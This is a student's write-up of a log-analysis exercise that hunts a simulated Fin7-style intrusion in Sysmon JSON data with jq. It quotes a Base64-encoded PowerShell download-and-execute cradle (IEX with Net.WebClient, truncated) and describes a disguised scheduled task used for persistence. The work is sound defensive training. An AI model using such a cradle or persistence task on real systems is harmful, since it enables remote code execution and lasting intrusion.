Module 1 Task: Hunting the Ghost in the Machine

Format: Raw Log Analysis (JSON)

Scenario

An alert was triggered by a third-party threat intelligence feed suggesting an IP
associated with the Fin7 threat group was communicating with your network. However,
the automated EDR did not block anything.

Your Objective:

Analyze the provided JSON log dataset (extracted from Sysmon) to identify the entry
point, the persistence mechanism, and the attacker's ultimate goal.

The Dataset

The dataset contains 500+ entries of system activity. Only 1% of it is malicious.

Part 1: Identification

1. Search the logs for any NetworkConnection events to the suspicious IP:
192.168.10.45.
2. Once you find the connection, identify the Process ID (PID) and the Image Name
that made the call.
3. Why didn't the Antivirus catch this Image?

Part 2: Persistence Hunt

1. Attackers often use Scheduled Tasks or Registry Run Keys.
2. Filter the logs for ProcessCreate events involving schtasks.exe or reg.exe.
3. Identify the specific command-line used to ensure the attacker remains in the
system after a reboot.

Part 3: The Payload

1. Find the ProcessCreate event for powershell.exe.
2. The command line is Base64 encoded. You must decode it (use CyberChef or
Linux base64 -d) to reveal the hidden intent.
You can use 'jq' on Linux o

**Steps**

The directories for the task was created
```bash
mkdir cybersecurity/module1
```

The downloaded dataset was copied into the working directory
```bash
cp Task1_dataset.json ~/cybersecurity/module1/
```

Then navigated to the working directory
```bash
cd ~/cybersecurity/module1
```

jq was installed since the task recomended using jq to analyse the JSON
```bash
sudo apt update

sudo apt install jq
```

Part1: Identification

1. Searching the log

```bash
jq '.' Task1_dataset.json
```

The output of the above command shows a connection to the suspicious IP 192.168.10.45

2. There is no PID field in this particular JSON event while the image name is powershell.exe

3. The dataset does not explicitly state why the antivirus failed to detect it. However, the attacker used the legitimate Windows PowerShell executable and hid the command using PowerShell's -enc (EncodedCommand) option, making the malicious intent less apparent from the process image alone.

Decoding the powershell command:

The encoded portion of the Base64 value was automatically extracted 
```bash
jq -r '.[] | select(.Image | endswith("powershell.exe")) | .CommandLine' Task1_dataset.json | cut -d' ' -f2
```

It was then decoded
```bash
jq -r '.[] | select(.Image | endswith("powershell.exe")) | .CommandLine' Task1_dataset.json | cut -d' ' -f2 | base64 -d | iconv -f UTF-16LE -t UTF-8
```

Based strictly on the dataset:

powershell.exe connected to 192.168.10.45:80, It used
-enc and this implies the command was Base64 encoded.

The decoded content contains:

New-Object Net.WebClient

Net.WebClient is used to communicate with remote servers.

Shortly afterward, schtasks.exe created WindowsUpdateCheck which runs C:\Users\Public\Update.exe every 30 minutes.

Part2: Persistence

Investigating schtasks.exe

```bash
jq '.[] | select(.Image | endswith("schtasks.exe"))' Task1_dataset.json
```

Persistence mechanism: The attacker created a Windows Scheduled Task using schtasks.exe. The task was named WindowsUpdateCheck and configured to execute C:\Users\Public\Update.exe every 30 minutes (/SC MINUTE /MO 30). The event is associated with Musa-Workstation\User1.

Part3: The Payload

Inspected the exact encoded value and determined whether the dataset contains enough characters to fully decode it

```bash
jq -r '.[] | select(.Image | endswith("powershell.exe")) | .CommandLine' Task1_dataset.json
```

The Base64 string appears to be truncated from the output of the above command

The Base64 bytes was then decoded to see the actual bytes
```bash
echo 'SQBFAVggACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAb3duAGw=' | base64 -d | xxd
```

The truncation was verified
```bash
echo 'SQBFAVggACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAb3duAGw=' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

The raw byte was inspected to see the actual hexadecimal bytes
```bash
echo 'SQBFAVggACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAb3duAGw=' | base64 -d | xxd
```

The output of the above command shows the dataset's Base64 payload itself is malformed/truncated


The encoded PowerShell payload begins with IEX (New-Object Net.WebClient).Downl.... This indicates an attempt to use PowerShell's Net.WebClient functionality to retrieve content from a remote source and execute it with IEX. However, the Base64 payload in the supplied dataset is truncated/malformed, so the exact download method, URL, and final payload cannot be determined from the available data.
